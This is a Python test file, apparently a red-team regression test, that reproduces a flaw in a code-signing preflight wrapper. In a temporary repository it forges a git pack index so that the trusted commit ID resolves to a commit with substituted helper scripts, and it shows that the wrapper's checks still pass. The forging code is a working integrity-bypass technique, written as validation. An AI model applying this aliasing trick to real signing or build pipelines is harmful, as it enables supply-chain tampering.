#!/usr/bin/env python3
"""Exploit-positive witness for Apple-signing accepted Git-object authority.

The private field preflight names an externally accepted source commit, but later
re-resolves its oracle and receipt-sealer blobs from the caller-owned local Git
object database. A corrupt v2 pack index can alias that accepted commit OID to a
different commit whose tree preserves the wrapper itself while substituting the
privileged helper objects. The current wrapper then observes the accepted HEAD
name, a clean worktree, and its own accepted wrapper blob while deriving and
root-materializing attacker helper blobs self-consistently.

This is validation-only. A passing test means the exploit premise is reproduced;
it is not product acceptance and creates no Apple-signing or physical authority.
"""
from __future__ import annotations

import hashlib
from pathlib import Path
import struct
import subprocess
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[3]
TRANSPORT = ROOT / "scripts/field/run_apple_signing_context_preflight.command"
GIT = "/usr/bin/git"
WRAPPER_PATH = "scripts/field/run_apple_signing_context_preflight.command"
ORACLE_PATH = "scripts/ci/tests/test_capture_signed_app_field_uid_apple_development_signing.py"
SEALER_PATH = "scripts/ci/capture_apple_signing_preflight_receipt_seal.py"


def git_object_oid(kind: str, payload: bytes) -> str:
    return hashlib.sha1(
        kind.encode("ascii")
        + b" "
        + str(len(payload)).encode("ascii")
        + b"\0"
        + payload
    ).hexdigest()


def git_blob_oid(payload: bytes) -> str:
    return git_object_oid("blob", payload)


class CaptureAppleSigningGitObjectChainRedTeamTests(unittest.TestCase):
    def _raw_git(
        self,
        repo: Path,
        *args: str,
        input_bytes: bytes | None = None,
        check: bool = True,
    ) -> subprocess.CompletedProcess[bytes]:
        return subprocess.run(
            [GIT, "-C", str(repo), *args],
            input=input_bytes,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=check,
        )

    def _transport_git(
        self,
        repo: Path,
        *args: str,
        check: bool = True,
    ) -> subprocess.CompletedProcess[bytes]:
        environment = {
            "PATH": "/usr/bin:/bin:/usr/sbin:/sbin",
            "LC_ALL": "C",
            "GIT_NO_REPLACE_OBJECTS": "1",
            "GIT_CONFIG_NOSYSTEM": "1",
            "GIT_CONFIG_GLOBAL": "/dev/null",
            "GIT_OPTIONAL_LOCKS": "0",
        }
        return subprocess.run(
            [
                GIT,
                f"--git-dir={repo / '.git'}",
                f"--work-tree={repo}",
                "-c",
                "core.hooksPath=/dev/null",
                *args,
            ],
            env=environment,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=check,
        )

    def _write(self, repo: Path, relative: str, payload: bytes) -> None:
        target = repo / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(payload)

    def _make_repository(
        self, repo: Path
    ) -> tuple[str, str, str, str, str, bytes, bytes]:
        repo.mkdir(parents=True)
        self._raw_git(repo, "init", "-q")
        self._raw_git(repo, "config", "user.email", "nembra@example.invalid")
        self._raw_git(repo, "config", "user.name", "Nembra Red Team")

        wrapper = b"#!/bin/bash\necho accepted-wrapper\n"
        accepted_oracle = b'print("accepted-oracle")\n'
        accepted_sealer = b'print("accepted-sealer")\n'
        self._write(repo, WRAPPER_PATH, wrapper)
        self._write(repo, ORACLE_PATH, accepted_oracle)
        self._write(repo, SEALER_PATH, accepted_sealer)
        self._raw_git(repo, "add", ".")
        self._raw_git(repo, "commit", "-qm", "accepted fixture")

        accepted_commit = self._raw_git(repo, "rev-parse", "HEAD").stdout.decode().strip()
        accepted_wrapper_blob = self._raw_git(
            repo, "rev-parse", f"HEAD:{WRAPPER_PATH}"
        ).stdout.decode().strip()
        accepted_oracle_blob = self._raw_git(
            repo, "rev-parse", f"HEAD:{ORACLE_PATH}"
        ).stdout.decode().strip()
        accepted_sealer_blob = self._raw_git(
            repo, "rev-parse", f"HEAD:{SEALER_PATH}"
        ).stdout.decode().strip()
        self.assertEqual(git_blob_oid(wrapper), accepted_wrapper_blob)
        self.assertEqual(git_blob_oid(accepted_oracle), accepted_oracle_blob)
        self.assertEqual(git_blob_oid(accepted_sealer), accepted_sealer_blob)
        accepted_commit_payload = self._raw_git(
            repo, "cat-file", "commit", accepted_commit
        ).stdout
        self.assertEqual(git_object_oid("commit", accepted_commit_payload), accepted_commit)

        attacker_oracle = b'print("ATTACKER-ORACLE")\n'
        attacker_sealer = b'print("ATTACKER-SEALER")\n'
        self._write(repo, ORACLE_PATH, attacker_oracle)
        self._write(repo, SEALER_PATH, attacker_sealer)
        self._raw_git(repo, "add", ORACLE_PATH, SEALER_PATH)
        self._raw_git(repo, "commit", "-qm", "attacker helper fixture")
        attacker_commit = self._raw_git(repo, "rev-parse", "HEAD").stdout.decode().strip()

        self.assertEqual(
            self._raw_git(repo, "rev-parse", f"HEAD:{WRAPPER_PATH}").stdout.decode().strip(),
            accepted_wrapper_blob,
        )
        return (
            accepted_commit,
            attacker_commit,
            accepted_wrapper_blob,
            accepted_oracle_blob,
            accepted_sealer_blob,
            attacker_oracle,
            attacker_sealer,
        )

    def _forge_single_commit_alias(
        self, repo: Path, *, source_oid: str, alias_oid: str
    ) -> Path:
        pack_prefix = repo / ".git" / "objects" / "pack" / "pack"
        pack_hash = self._raw_git(
            repo,
            "pack-objects",
            str(pack_prefix),
            input_bytes=(source_oid + "\n").encode("ascii"),
        ).stdout.decode().strip()

        for oid in (source_oid, alias_oid):
            loose = repo / ".git" / "objects" / oid[:2] / oid[2:]
            if loose.exists():
                loose.unlink()

        index = repo / ".git" / "objects" / "pack" / f"pack-{pack_hash}.idx"
        data = bytearray(index.read_bytes())
        self.assertEqual(data[:4], b"\xfftOc")
        self.assertEqual(struct.unpack(">I", data[4:8])[0], 2)
        fanout_offset = 8
        names_offset = fanout_offset + 256 * 4
        count = struct.unpack(
            ">I", data[fanout_offset + 255 * 4 : fanout_offset + 256 * 4]
        )[0]
        self.assertEqual(count, 1)

        data[names_offset : names_offset + 20] = bytes.fromhex(alias_oid)
        first_byte = int(alias_oid[:2], 16)
        for index_value in range(256):
            struct.pack_into(
                ">I",
                data,
                fanout_offset + index_value * 4,
                0 if index_value < first_byte else 1,
            )
        data[-20:] = hashlib.sha1(data[:-20]).digest()
        index.chmod(index.stat().st_mode | 0o200)
        index.write_bytes(data)
        return index

    def test_corrupt_commit_alias_satisfies_current_wrapper_checks_with_attacker_helpers(self) -> None:
        with tempfile.TemporaryDirectory(prefix="nembra-apple-signing-git-alias-") as directory:
            repo = Path(directory) / "repo"
            (
                accepted_commit,
                attacker_commit,
                accepted_wrapper_blob,
                accepted_oracle_blob,
                accepted_sealer_blob,
                attacker_oracle,
                attacker_sealer,
            ) = self._make_repository(repo)

            forged_index = self._forge_single_commit_alias(
                repo,
                source_oid=attacker_commit,
                alias_oid=accepted_commit,
            )
            (repo / ".git" / "HEAD").write_text(accepted_commit + "\n", encoding="ascii")

            observed_head = self._transport_git(repo, "rev-parse", "HEAD").stdout.decode().strip()
            self.assertEqual(observed_head, accepted_commit)
            status = self._transport_git(
                repo, "status", "--porcelain=v1", "--untracked-files=all"
            ).stdout
            self.assertEqual(status, b"")

            derived_wrapper = self._transport_git(
                repo, "rev-parse", f"{accepted_commit}:{WRAPPER_PATH}"
            ).stdout.decode().strip()
            executing_wrapper = self._transport_git(
                repo, "hash-object", str(repo / WRAPPER_PATH)
            ).stdout.decode().strip()
            self.assertEqual(derived_wrapper, accepted_wrapper_blob)
            self.assertEqual(executing_wrapper, accepted_wrapper_blob)

            derived_oracle = self._transport_git(
                repo, "rev-parse", f"{accepted_commit}:{ORACLE_PATH}"
            ).stdout.decode().strip()
            derived_sealer = self._transport_git(
                repo, "rev-parse", f"{accepted_commit}:{SEALER_PATH}"
            ).stdout.decode().strip()
            self.assertNotEqual(derived_oracle, accepted_oracle_blob)
            self.assertNotEqual(derived_sealer, accepted_sealer_blob)

            oracle_payload = self._transport_git(repo, "cat-file", "blob", derived_oracle).stdout
            sealer_payload = self._transport_git(repo, "cat-file", "blob", derived_sealer).stdout
            self.assertEqual(oracle_payload, attacker_oracle)
            self.assertEqual(sealer_payload, attacker_sealer)
            self.assertEqual(git_blob_oid(oracle_payload), derived_oracle)
            self.assertEqual(git_blob_oid(sealer_payload), derived_sealer)

            substituted_commit = self._transport_git(
                repo, "cat-file", "commit", accepted_commit
            ).stdout
            self.assertEqual(git_object_oid("commit", substituted_commit), attacker_commit)
            self.assertNotEqual(git_object_oid("commit", substituted_commit), accepted_commit)

            verify = self._raw_git(repo, "verify-pack", "-v", str(forged_index), check=False)
            self.assertNotEqual(verify.returncode, 0)

    def test_current_field_transport_reopens_helper_identity_from_caller_git_graph(self) -> None:
        source = TRANSPORT.read_text(encoding="utf-8")
        self.assertIn(
            'HEAD_SHA="$("${GIT_ENV[@]}" "${GIT[@]}" rev-parse HEAD',
            source,
        )
        self.assertIn(
            'ORACLE_BLOB="$("${GIT_ENV[@]}" "${GIT[@]}" rev-parse "$SOURCE_SHA:$ORACLE_PATH"',
            source,
        )
        self.assertIn(
            'SEALER_BLOB="$("${GIT_ENV[@]}" "${GIT[@]}" rev-parse "$SOURCE_SHA:$SEALER_PATH"',
            source,
        )
        self.assertIn('cat-file blob "$blob"', source)
        self.assertNotIn(
            'cat-file commit "$SOURCE_SHA"',
            source,
            "expected-red classifier must be reclassified after exact accepted commit bytes are independently captured",
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
